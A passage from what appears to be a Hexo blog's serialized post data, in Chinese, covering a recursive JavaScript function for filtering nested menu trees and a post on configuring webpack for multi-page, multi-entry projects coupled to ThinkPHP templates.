)</span><br></pre></td></tr></table></figure>\n<p><code>filter</code>参数就是调用者传递的回调参数，执行的结果应该是一个boolean值来确定当前项目是否符合检索条件。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>之前对递归函数的理解还仅仅停留在书面，就是说从来没有在实际中用到过，不知道是运气好还是运气不好，做了这么久开发居然没碰到这种需求。不过倒是在<code>jQuery</code>的源码里目睹了使用递归算法的地方，<code>jQuery.extend</code>方法相信很多高玩都用过，用于拷贝对象，并且提供了深拷贝，这里的递归就是为了能够遍历对象内的对象内的对象内的对象…，这种数据我们总不能一直写下去把 😂，况且逻辑还是重复的。所以这里使用递归算法就巧妙的解决了这个问题。近日朋友在解决一个菜单搜索时遇到一个问题，这么个样子</p>\n<p><img src=\"20171124140432.jpg\" alt=\"效果图\"></p>\n<p>需求是匹配到关键字的菜单及其子菜单显示出来，就是说只要当前的菜单项匹配到了，那子菜单也全部显示。<br>\n天真的我以为用个<code>[].fitler</code>函数就行了，直到我看到了数据是这样的</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[ &#123;</span><br><span class=\"line\">  text: \"菜单1\",</span><br><span class=\"line\">  nodes: [ &#123;</span><br><span class=\"line\">    text: \"菜单1—菜单1\"</span><br><span class=\"line\">    nodes: ...</span><br><span class=\"line\">  &#125;, &#123;</span><br><span class=\"line\">    text: \"菜单1—菜单2\"</span><br><span class=\"line\">    nodes: ...</span><br><span class=\"line\">  &#125; ]</span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">  text: \"菜单2\",</span><br><span class=\"line\">  nodes: [ &#123;</span><br><span class=\"line\">    text: \"菜单2—菜单1\"</span><br><span class=\"line\">    nodes: ...</span><br><span class=\"line\">  &#125; ]</span><br><span class=\"line\">&#125; ]</span><br></pre></td></tr></table></figure>\n<p>就是说不知道菜单里有多少子菜单，所以去遍历就必须得用递归调用，将符合条件的菜单保留，好在最后解决了这个问题，下面贴出代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\"> * @param &#123;*&#125; arrayData 需要递归的数据 </span></span><br><span class=\"line\"><span class=\"comment\"> * @param &#123;*&#125; searchText 搜索关键字</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">recursionSearch</span>(<span class=\"params\"> arrayData, searchText </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 声明一个新的数组，不去操作原先的数据</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> newArry = [];</span><br><span class=\"line\">  <span class=\"comment\">// 第一层数据直接是菜单，所以不需要取nodes</span></span><br><span class=\"line\">  arrayData = arrayData.nodes || arrayData</span><br><span class=\"line\">  <span class=\"comment\">// 循环读取菜单数据</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> i = <span class=\"number\">0</span>, item; item = arrayData[ i++ ]; ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 菜单名称模糊查询</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( item.text &amp;&amp; item.text.indexOf( searchText ) &gt; <span class=\"number\">-1</span> ) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 条件满足就直接保留，不需要再遍历查找子菜单的项目</span></span><br><span class=\"line\">      newArry.push( item );</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 判断是否还有子菜单</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( item.nodes ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 子菜单存在，再走一次这个流程，将筛选出来的数据直接重新赋值给nodes</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> result = recursionSearch( item, searchText );</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( result.length ) &#123;</span><br><span class=\"line\">          item.nodes = result;</span><br><span class=\"line\">          <span class=\"comment\">// 将结果放进新的item</span></span><br><span class=\"line\">          newArry.push( item )</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 把筛选结果返回出去</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> newArry;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结果终究是出来了，居然花了一个多小时，中间一度要放弃了，但是秉着“老司机”的光环坚持弄出来了，还是蛮开心的。令人汗颜的是花了这么久。(lll￢ω￢)</p>\n<p>//-----------------更新----------------<br>\n如果这里需求变了，不再按照title来检索，而是检索disabled的项目，或者其他条件呢，上面的递归函数则需要变动一下，将检索条件开放出来由调用者自己来决定</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">recursionFilter</span>(<span class=\"params\"> arrayData, filter </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> newArry = [];</span><br><span class=\"line\">  arrayData = arrayData.nodes || arrayData</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> i = <span class=\"number\">0</span>, item; item = arrayData[ i++ ]; ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( filter( item ) ) &#123;</span><br><span class=\"line\">      newArry.push( item );</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( item.nodes ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> result = recursionFilter( item, filter );</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( result.length ) &#123;</span><br><span class=\"line\">          item.nodes = result;</span><br><span class=\"line\">          newArry.push( item )</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> newArry;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用者</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> result = recursionFilter( treeData, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> item </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> item.state.check === <span class=\"literal\">true</span></span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p><code>filter</code>参数就是调用者传递的回调参数，执行的结果应该是一个boolean值来确定当前项目是否符合检索条件。</p>\n"},{"title":"多页、多入口、前后端耦合的webpack配置","catalog":true,"date":"2017-08-17T13:08:48.000Z","subtitle":null,"header-img":"post/IMG_2725.JPG","_content":"`webpack`的流行给前端开发减少了许多不必要的工作，`webpack`可以让我们更纯粹的关注我们的代码，但是很多人认为它更适合单页应用，主要有以下一些痛点\n\n* 如果模板是后台管理的生成的怎么办\n* 我目前没有使用任何模块化的开发方式，或使用了模块加载器（如`seajs`、`requireJs`等）\n\n其实第二点我已经在上篇文章中讲过了，如果平滑的过渡到`webpack`，痛点一也解释过，只是没有详细的说明，此次分享一个完整的配置，来应对你的多页项目。不管是`jsp`、`php`、`html`、`xshtml`都可以通过具体的配置来使用`webpack`，为什么如此青睐`webpack`，在我看来热**更新技术**、`less`、`sass`、`es6`、`es7`的引入是最吸引我的（尝试过使用`gulp`、但是感觉并没有`webpack`这种一站式服务来得顺手），下面我详细讲述下下面一些配置的用途，部分代码来自[vue-cli](https://github.com/vuejs/vue-cli)。\n\n```\n├─build                 // webpack的配置文件存放目录\n├─Public                // 我们的前端资源存放目录\n│  ├─dev                // 源码存放目录（可以改名为src）\n│  │  ├─css             // 一些共用的css文件，共用才放这里哦\n│  │  ├─font            // 字体文件\n│  │  ├─images          // 图片文件\n│  │  └─js              // js文件\n│  │      ├─libs        // npm里没有的第三方插件或库\n│  │      ├─modules     // 项目的业务组件存放目录\n│  │      └─page        // 页面的目录\n│  │          └─Index   // 具体的页面名称\n│  └─dist               // 编译后的存放目录\n└─static                // 好像是拿来缓存文件用的？vue-cli存在的\n```\n当然，我目前开发的项目是半路引入`webpack`的，大部分都还是`jQuery`那套东西、但是我还是秉着**关注点分离**的原则，将`html`、`css`、`js`按页面来放了，不再使用老掉牙的按文件类型来放、那是因为有了`webpack`的打包才可以这么随意。除了分离出来的模板（`ThinkPHP`用`<include file=\"\"/>`标签来引入模板）文件，js和css都是放到同模板名的Public/dev/js/modules目录里了，这样一来可以直接像这样\n```javascript\nrequire( './style.less' );\n...\n```\n先在js文件的头部引入这个组件的样式文件，再来写js代码，至少我们在使用组件的时候不必关心css了（下篇文章会讲讲重构后如何连html也不关注了）\n\n#### images\n这里为什么会有一个`images`目录看起来很多余呢，那是因为我们的php模板里的图片标签`src`前面都带了一个`php`的系统变量，`webpack`插件的静态分析是无法识别这里的路径的，所以保留了这个目录，在打包后用插件拷贝到打包目录里\n****\n2018年1月19日更新，后面发现了一个有趣的插件，可以在这里识别这些后端的常量代码如下（需要配合使用html-loader）\n```js\nnew webpack.NormalModuleReplacementPlugin(\n  /__RESPATH__/,\n  function( resource ) {\n    // 我们在这里直接替换这个常量让webpack插件（file-loader）去解析\n    resource.request = resource.request.replace( /^\\.\\/__RESPATH__/, path.resolve( __dirname, '..', 'Public/dev' ) );\n  }\n),\n```\n\n还有一些疑难杂症的url例如(只针对html-loader)\n```\n__RESPATH__/images/hy{$_SESSION['vip']|default='0'}.png\n```\n这种插件也是无法识别的，而且html-loader目前也不支持url筛选，估计是要等到1.0版本吧，解决方案也是很绕，修改一句它的源码（为了方便就把它整个代码拷贝出来吧）\n/html-loader/index.js\n54行的位置大概是，在\n```js\nif ( !loaderUtils.isUrlRequest( link.value, root ) ) return;\n```\n下面添加一句\n```js\nif ( link.value.match( /\\{\\$[\\s\\S]*?\\}/ ) ) return;\n```\n将匹配到{$xxxx}这种url直接跳过不解析，当然如果你是常量就做替换，这样就完美解决问题，等到html-loader更新支持筛选我们再切回去\n****\n\n#### page\n然后是`page`这个目录，这个目录是拿来存放我们页面的三剑客的，比如有一个叫`index`的目录，里面有`css`、`js`、`html`文件，这里的`index`可以看作是一个页面目录，也可以看作是一个分类，如果是分类，那下面就应该是页面了，html里不应该引用`css`文件和`js`文件，因为webpack会帮我们插入生成新的html到我们指定的目录里\n\n最重要的就是`build`目录下的了\n\n#### config.js\n`proxyTable`项我已经在上篇文章中讲过了，这里就不赘述了\n\n#### mapping.js\n这个文件就是描述我们`entry`也就是入口文件和html模板之间的关系映射的文件的\n\n```javascript\nmodule.exports = {\n  // 微知首页\n  'Index': {\n    // 对应到Public/dev/js/page的文件夹名称\n    file: 'main',\n    // 视图层的文件名称，默认为index\n    viewFile: 'index',\n    disable: false,\n    templateOutput: 'Index'\n  },\n  'EditText': {\n    chunks: [ 'editor' ],\n    disable: false\n  },\n  // 编辑模板\n  'Template': {\n    chunks: [ 'editor' ],\n    disable: true\n  },\n  // 默认模板\n  'GzhArtStyle': {\n    chunks: [ 'editor' ],\n    disable: true\n  }\n};\n```\n这里导出的每个对象的键值都对应了`page`目录里的名字，下面的`file`字段对应的入口js文件名称，默认为`main`，`viewFile`对应的是html模板名称，默认为`index`，这里很有用，因为在`ThinkPHP`的`View`目录里模板部分文件夹的，所以我们配合`templateOutput`把html输出过去就不存在目录了，`templateOutput`的默认值为这个对象的键值如Index默认为Index。`disable`字段是开发模式使用的，当运行`npm run dev`命令时会自动扫描这个字段，若为`false`才会启动，如果全部都为false，那么你页面越多造成性能开销就越大，所以除非你同时去开发几个页面，这里建议启动的页面不超过5个，其他页面若要运行，提前`npm run build`一次让它跑编译后的代码就好了。`chunks`字段是用来标记当前页面依赖的除了共有`chunks`需要依赖的其他`chunks`，上面的有chunks字段的三个页面都是引用了百度编辑器，因为百度编辑器的包都太大了，所以不建议抽取到公用的chunk里，这里的配置在`webpack.prod.cfg.js`文件里有单独配置。\n#### utils.js\n这个文件主要是`getHtmlWebpackPlugins`方法，配合注释您就能看懂刚才的mapping配置都怎么用的了\n```javascript\nexports.getHtmlWebpackPlugins = ( rename ) => {\n  let HtmlWebpackPlugins = [];\n  Object.keys( mapping ).forEach( function( name ) {\n    // 如果不是开发环境 就全部打包\n    // 如果是开发环境 就根据disable来进行打包\n    ( process.env.NODE_ENV !== 'development' ||\n      !mapping[ name ].disable ) &&\n    HtmlWebpackPlugins.push(\n      new HtmlWebpackPlugin( {\n        alwaysWriteToDisk: true,\n        // php端使用到的模板\n        // 如果是其他目录在此修改路径\n        filename: `${ROOT}/Application/Home/View/${mapping[ name ].templateOutput ? mapping[ name ].templateOutput : name}/${mapping[name].viewFile || 'index'}.html`,\n        // 插件用的模板文件\n        template: `${ROOT}/${config.$d}/js/page/${name}/${mapping[name].viewFile || 'index'}.${mapping[name].templateType || 'html'}`,\n        chunks: ( function() {\n          if ( !rename ) {\n            //let chunks = [ 'vendor.npm', 'vendor.TP', 'manifest', 'vendor.modules' ];\n            let chunks = [ 'vendor.modules', 'vendor', 'manifest' ];\n            if ( mapping[ name ].chunks ) {\n              chunks = chunks.concat( mapping[ name ].chunks );\n            }\n            return chunks;\n          }\n          return [];\n        }() ).concat( [ `${rename ? config.dev.entryPrefix : ''}${name}` ] ),\n        // 手工排序\n        chunksSortMode: 'manual',\n        inject: true,\n        showErrors: false\n      } ) );\n  } );\n  return HtmlWebpackPlugins;\n}\n```\n`alwaysWriteToDisk`这个字段是我们能前后端结合开发的关键，没有使用后端模板的项目真的做到前后分离时是不需要这个字段的，因为PHP会读这个文件再渲染数据出来给浏览器\n\n#### webpack.base.cfg.js、webpack.dev.cfg.js\n都是些老生常谈的配置，这里就不赘述了。值得注意的是`dev.client.js`这个文件被我删了，因为使用了`alwaysWriteToDisk`实时写入的功能，改变css文件和js文件都会强制刷新，那热更新完全就没法用了，所以html文件的变化还是需要手动刷新的\n\n#### webpack.prod.cfg.js\n`HtmlWebpackPlugin`这个插件确实是有多少页面就要插入多少个实例进去的，所以直接\n```javascript\n...utils.getHtmlWebpackPlugins( false ),\n```\n展开这个数组就好了，这里传入的布尔参数是为了区分开发模式和build模式，传入`true`只会有一个chunk被包含进来，就是当前页面依赖的所有js和css等\n然后是`chunks`\n##### manifest\n有的页面因为太简单并没有依赖太多共用的js，但是依赖了共用的css，所以这个chunk仅仅是为了抽取css文件用，造成引用了一个空的js，暂时没有想到好的解决办法，欢迎再issues提出改进建议\n\n##### vendor.modules\n这个chunk是为了抽取我们自己写的业务组件、在修改业务组件后能够很好的利用缓存只更新这一个文件\n\n##### commonChunk\n上文`mapping`里的chunks字段就是这里配置的，如果还有其他局部共用的大chunk可以在这里再配置一个\n##### vendor\nvendor就是拿来放置第三方插件的，这里抽取了npm和lib里面的，当项目稳定后处于一个稳定的维护期，没有较大改动时，这个文件就可以长期缓存在用户的电脑里了。\n\n```javascript\nnew CopyWebpackPlugin( [ {\n  from: path.resolve( __dirname, `../${config.$d}/images` ),\n  to: `${config.build.assetsSubDirectory}/images`,\n  ignore: [ '.*' ]\n} ] ),\n```\n上面的代码就是拷贝images这个目录到我们打包生成的目录里，防止资源丢失的问题\n***\n这个脚手架很可能无法直接运行在你的项目里，但是能为你的多页入口的`website`提供一个很好的引入`webpack`的思路\n\n嗯，留下仓库[传送门](https://github.com/Ryuurock/vue-muilt-page-config)\n\nhave fun ~~","source":"_posts/vue-muilt-page-config.md","raw":"---\ntitle: 多页、多入口、前后端耦合的webpack配置\ncatalog: true\ndate: 2017-08-17 21:08:48\nsubtitle:\nheader-img: post/IMG_2725.JPG\ntags: \n- vuejs\n- webpack \n- \n---\n`webpack`的流行给前端开发减少了许多不必要的工作，`webpack`可以让我们更纯粹的关注我们的代码，但是很多人认为它更适合单页应用，主要有以下一些痛点\n\n* 如果模板是后台管理的生成的怎么办\n* 我目前没有使用任何模块化的开发方式，或使用了模块加载器（如`seajs`、`requireJs`等）\n\n其实第二点我已经在上篇文章中讲过了，如果平滑的过渡到`webpack`，痛点一也解释过，只是没有详细的说明，此次分享一个完整的配置，来应对你的多页项目。不管是`jsp`、`php`、`html`、`xshtml`都可以通过具体的配置来使用`webpack`，为什么如此青睐`webpack`，在我看来热**更新技术**、`less`、`sass`、`es6`、`es7`的引入是最吸引我的（尝试过使用`gulp`、但是感觉并没有`webpack`这种一站式服务来得顺手），下面我详细讲述下下面一些配置的用途，部分代码来自[vue-cli](https://github.com/vuejs/vue-cli)。\n\n```\n├─build                 // webpack的配置文件存放目录\n├─Public                // 我们的前端资源存放目录\n│  ├─dev                // 源码存放目录（可以改名为src）\n│  │  ├─css             // 一些共用的css文件，共用才放这里哦\n│  │  ├─font            // 字体文件\n│  │  ├─images          // 图片文件\n│  │  └─js              // js文件\n│  │      ├─libs        // npm里没有的第三方插件或库\n│  │      ├─modules     // 项目的业务组件存放目录\n│  │      └─page        // 页面的目录\n│  │          └─Index   // 具体的页面名称\n│  └─dist               // 编译后的存放目录\n└─static                // 好像是拿来缓存文件用的？vue-cli存在的\n```\n当然，我目前开发的项目是半路引入`webpack`的，大部分都还是`jQuery`那套东西、但是我还是秉着**关注点分离**的原则，将`html`、`css`、`js`按页面来放了，不再使用老掉牙的按文件类型来放、那是因为有了`webpack`的打包才可以这么随意。除了分离出来的模板（`ThinkPHP`用`<include file=\"\"/>`标签来引入模板）文件，js和css都是放到同模板名的Public/dev/js/modules目录里了，这样一来可以直接像这样\n```javascript\nrequire( './style.less' );\n...\n```\n先在js文件的头部引入这个组件的样式文件，再来写js代码，至少我们在使用组件的时候不必关心css了（下篇文章会讲讲重构后如何连html也不关注了）\n\n#### images\n这里为什么会有一个`images`目录看起来很多余呢，那是因为我们的php模板里的图片标签`src`前面都带了一个`php`的系统变量，`webpack`插件的静态分析是无法识别这里的路径的，所以保留了这个目录，在打包后用插件拷贝到打包目录里\n****\n2018年1月19日更新，后面发现了一个有趣的插件，可以在这里识别这些后端的常量代码如下（需要配合使用html-loader）\n```js\nnew webpack.NormalModuleReplacementPlugin(\n  /__RESPATH__/,\n  function( resource ) {\n    // 我们在这里直接替换这个常量让webpack插件（file-loader）去解析\n    resource.request = resource.request.replace( /^\\.\\/__RESPATH__/, path.resolve( __dirname, '..', 'Public/dev' ) );\n  }\n),\n```\n\n还有一些疑难杂症的url例如(只针对html-loader)\n```\n__RESPATH__/images/hy{$_SESSION['vip']|default='0'}.png\n```\n这种插件也是无法识别的，而且html-loader目前也不支持url筛选，估计是要等到1.0版本吧，解决方案也是很绕，修改一句它的源码（为了方便就把它整个代码拷贝出来吧）\n/html-loader/index.js\n54行的位置大概是，在\n```js\nif ( !loaderUtils.isUrlRequest( link.value, root ) ) return;\n```\n下面添加一句\n```js\nif ( link.value.match( /\\{\\$[\\s\\S]*?\\}/ ) ) return;\n```\n将匹配到{$xxxx}这种url直接跳过不解析，当然如果你是常量就做替换，这样就完美解决问题，等到html-loader更新支持筛选我们再切回去\n****\n\n#### page\n然后是`page`这个目录，这个目录是拿来存放我们页面的三剑客的，比如有一个叫`index`的目录，里面有`css`、`js`、`html`文件，这里的`index`可以看作是一个页面目录，也可以看作是一个分类，如果是分类，那下面就应该是页面了，html里不应该引用`css`文件和`js`文件，因为webpack会帮我们插入生成新的html到我们指定的目录里\n\n最重要的就是`build`目录下的了\n\n#### config.js\n`proxyTable`项我已经在上篇文章中讲过了，这里就不赘述了\n\n#### mapping.js\n这个文件就是描述我们`entry`也就是入口文件和html模板之间的关系映射的文件的\n\n```javascript\nmodule.exports = {\n  // 微知首页\n  'Index': {\n    // 对应到Public/dev/js/page的文件夹名称\n    file: 'main',\n    // 视图层的文件名称，默认为index\n    viewFile: 'index',\n    disable: false,\n    templateOutput: 'Index'\n  },\n  'EditText': {\n    chunks: [ 'editor' ],\n    disable: false\n  },\n  // 编辑模板\n  'Template': {\n    chunks: [ 'editor' ],\n    disable: true\n  },\n  // 默认模板\n  'GzhArtStyle': {\n    chunks: [ 'editor' ],\n    disable: true\n  }\n};\n```\n这里导出的每个对象的键值都对应了`page`目录里的名字，下面的`file`字段对应的入口js文件名称，默认为`main`，`viewFile`对应的是html模板名称，默认为`index`，这里很有用，因为在`ThinkPHP`的`View`目录里模板部分文件夹的，所以我们配合`templateOutput`把html输出过去就不存在目录了，`templateOutput`的默认值为这个对象的键值如Index默认为Index。`disable`字段是开发模式使用的，当运行`npm run dev`命令时会自动扫描这个字段，若为`false`才会启动，如果全部都为false，那么你页面越多造成性能开销就越大，所以除非你同时去开发几个页面，这里建议启动的页面不超过5个，其他页面若要运行，提前`npm run build`一次让它跑编译后的代码就好了。`chunks`字段是用来标记当前页面依赖的除了共有`chunks`需要依赖的其他`chunks`，上面的有chunks字段的三个页面都是引用了百度编辑器，因为百度编辑器的包都太大了，所以不建议抽取到公用的chunk里，这里的配置在`webpack.prod.cfg.js`文件里有单独配置。\n#### utils.js\n这个文件主要是`getHtmlWebpackPlugins`方法，配合注释您就能看懂刚才的mapping配置都怎么用的了\n```javascript\nexports.getHtmlWebpackPlugins = ( rename ) => {\n  let HtmlWebpackPlugins = [];\n  Object.keys( mapping ).forEach( function( name ) {\n    // 如果不是开发环境 就全部打包\n    // 如果是开发环境 就根据disable来进行打包\n    ( process.env.NODE_ENV !== 'development' ||\n      !mapping[ name ].disable ) &&\n    HtmlWebpackPlugins.push(\n      new HtmlWebpackPlugin( {\n        alwaysWriteToDisk: true,\n        // php端使用到的模板\n        // 如果是其他目录在此修改路径\n        filename: `${ROOT}/Application/Home/View/${mapping[ name ].templateOutput ? mapping[ name ].templateOutput : name}/${mapping[name].viewFile || 'index'}.html`,\n        // 插件用的模板文件\n        template: `${ROOT}/${config.$d}/js/page/${name}/${mapping[name].viewFile || 'index'}.${mapping[name].templateType || 'html'}`,\n        chunks: ( function() {\n          if ( !rename ) {\n            //let chunks = [ 'vendor.npm', 'vendor.TP', 'manifest', 'vendor.modules' ];\n            let chunks = [ 'vendor.modules', 'vendor', 'manifest' ];\n            if ( mapping[ name ].chunks ) {\n              chunks = chunks.concat( mapping[ name ].chunks );\n            }\n            return chunks;\n          }\n          return [];\n        }() ).concat( [ `${rename ? config.dev.entryPrefix : ''}${name}` ] ),\n        // 手工排序\n        chunksSortMode: 'manual',\n        inject: true,\n        showErrors: false\n      } ) );\n  } );\n  return HtmlWebpackPlugins;\n}\n```\n`alwaysWriteToDisk`这个字段是我们能前后端结合开发的关键，没有使用后端模板的项目真的做到前后分离时是不需要这个字段的，因为PHP会读这个文件再渲染数据出来给浏览器\n\n#### webpack.base.cfg.js、webpack.dev.cfg.js\n都是些老生常谈的配置，这里就不赘述了。值得注意的是`dev.client.js`这个文件被我删了，因为使用了`alwaysWriteToDisk`实时写入的功能，改变css文件和js文件都会强制刷新，那热更新完全就没法用了，所以html文件的变化还是需要手动刷新的\n\n#### webpack.prod.cfg.js\n`HtmlWebpackPlugin`这个插件确实是有多少页面就要插入多少个实例进去的，所以直接\n```javascript\n...utils.getHtmlWebpackPlugins( false ),\n```\n展开这个数组就好了，这里传入的布尔参数是为了区分开发模式和build模式，传入`true`只会有一个chunk被包含进来，就是当前页面依赖的所有js和css等\n然后是`chunks`\n##### manifest\n有的页面因为太简单并没有依赖太多共用的js，但是依赖了共用的css，所以这个chunk仅仅是为了抽取css文件用，造成引用了一个空的js，暂时没有想到好的解决办法，欢迎再issues提出改进建议\n\n##### vendor.modules\n这个chunk是为了抽取我们自己写的业务组件、在修改业务组件后能够很好的利用缓存只更新这一个文件\n\n##### commonChunk\n上文`mapping`里的chunks字段就是这里配置的，如果还有其他局部共用的大chunk可以在这里再配置一个\n##### vendor\nvendor就是拿来放置第三方插件的，这里抽取了npm和lib里面的，当项目稳定后处于一个稳定的维护期，没有较大改动时，这个文件就可以长期缓存在用户的电脑里了。\n\n```javascript\nnew CopyWebpackPlugin( [ {\n  from: path.resolve( __dirname, `../${config.$d}/images` ),\n  to: `${config.build.assetsSubDirectory}/images`,\n  ignore: [ '.*' ]\n} ] ),\n```\n上面的代码就是拷贝images这个目录到我们打包生成的目录里，防止资源丢失的问题\n***\n这个脚手架很可能无法直接运行在你的项目里，但是能为你的多页入口的`website`提供一个很好的引入`webpack`的思路\n\n嗯，留下仓库[传送门](https://github.com/Ryuurock/vue-muilt-page-config)\n\nhave fun ~~","slug":"vue-muilt-page-config","published":1,"updated":"2018-01-22T02:41:57.008Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjwg000yi4ucy5u32reh","content":"<p><code>webpack</code>的流行给前端开发减少了许多不必要的工作，<code>webpack</code>可以让我们更纯粹的关注我们的代码，但是很多人认为它更适合单页应用，主要有以下一些痛点</p>\n<ul>\n<li>如果模板是后台管理的生成的怎么办</li>\n<li>我目前没有使用任何模块化的开发方式，或使用了模块加载器（如<code>seajs</code>、<code>requireJs</code>等）</li>\n</ul>\n<p>其实第二点我已经在上篇文章中讲过了，如果平滑的过渡到<code>webpack</code>，痛点一也解释过，只是没有详细的说明，此次分享一个完整的配置，来应对你的多页项目。不管是<code>jsp</code>、<code>php</code>、<code>html</code>、<code>xshtml</code>都可以通过具体的配置来使用<code>webpack</code>，为什么如此青睐<code>webpack</code>，在我看来热<strong>更新技术</strong>、<code>less</code>、<code>sass</code>、<code>es6</code>、<code>es7</code>的引入是最吸引我的（尝试过使用<code>gulp</code>、但是感觉并没有<code>webpack</code>这种一站式服务来得顺手），下面我详细讲述下下面一些配置的用途，部分代码来自<a href=\"https://github.com/vuejs/vue-cli\" target=\"_blank\" rel=\"noopener\">vue-cli</a>。</p>\n<figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├─build                 <span class=\"comment\">// webpack的配置文件存放目录</span></span><br><span class=\"line\">├─<span class=\"keyword\">Public</span>                <span class=\"comment\">// 我们的前端资源存放目录</span></span><br><span class=\"line\">│  ├─dev                <span class=\"comment\">// 源码存放目录（可以改名为src）</span></span><br><span class=\"line\">│  │  ├─css             <span class=\"comment\">// 一些共用的css文件，共用才放这里哦</span></span><br><span class=\"line\">│  │  ├─font            <span class=\"comment\">// 字体文件</span></span><br><span class=\"line\">│  │  ├─images          <span class=\"comment\">// 图片文件</span></span><br><span class=\"line\">│  │  └─js              <span class=\"comment\">// js文件</span></span><br><span class=\"line\">│  │      ├─libs        <span class=\"comment\">// npm里没有的第三方插件或库</span></span><br><span class=\"line\">│  │      ├─modules     <span class=\"comment\">// 项目的业务组件存放目录</span></span><br><span class=\"line\">│  │      └─page        <span class=\"comment\">// 页面的目录</span></span><br><span class=\"line\">│  │          └─<span class=\"keyword\">Index</span>   <span class=\"comment\">// 具体的页面名称</span></span><br><span class=\"line\">│  └─dist               <span class=\"comment\">// 编译后的存放目录</span></span><br><span class=\"line\">└─<span class=\"keyword\">static</span>                <span class=\"comment\">// 